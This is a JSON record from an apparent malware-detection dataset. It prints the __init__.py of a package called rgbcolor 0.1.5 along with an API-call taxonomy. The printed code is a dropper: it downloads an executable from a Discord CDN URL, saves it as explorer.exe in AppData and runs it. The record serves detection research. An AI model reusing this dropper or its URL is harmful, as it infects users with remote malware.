[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/rgbcolor-0.1.5/rgbcolor-0.1.5/rgbcolor/__init__.py",
    "code_snippet": "import requests\nimport subprocess\nimport os\n\npath = os.environ[\"USERPROFILE\"] + \"\\AppData\\Local\\explorer.exe\"\n\nresponse = requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&\")\n\nif response.status_code != 200:\n    exit()\n\nwith open(path, 'wb') as file:\n    file.write(response.content)\n\nif os.path.exists(path):\n    subprocess.run(path, shell=True)",
    "pattern_analysis": {
      "api_sequence": [
        "os.environ",
        "requests.get",
        "exit",
        "open",
        "file.write",
        "os.path.exists",
        "subprocess.run"
      ],
      "api_sequence_with_args": [
        "os.environ[\"USERPROFILE\"]",
        "requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&\")",
        "exit()",
        "open(path, 'wb')",
        "file.write(response.content)",
        "os.path.exists(path)",
        "subprocess.run(path, shell=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import requests\nimport subprocess\nimport os\n\npath = os.environ[\"USERPROFILE\"] + \"\\AppData\\Local\\explorer.exe\"\n\nresponse = requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175535799211659304/PythonLIB_1.exe?ex=656b9606&is=65592106&hm=17cf4142bb148bca6ce38208f92fa46f986a0237d449180356208426176fb1bb&\")\n\nif response.status_code != 200:\n    exit()\n\nwith open(path, 'wb') as file:\n    file.write(response.content)\n\nif os.path.exists(path):\n    subprocess.run(path, shell=True)"
    }
  }
]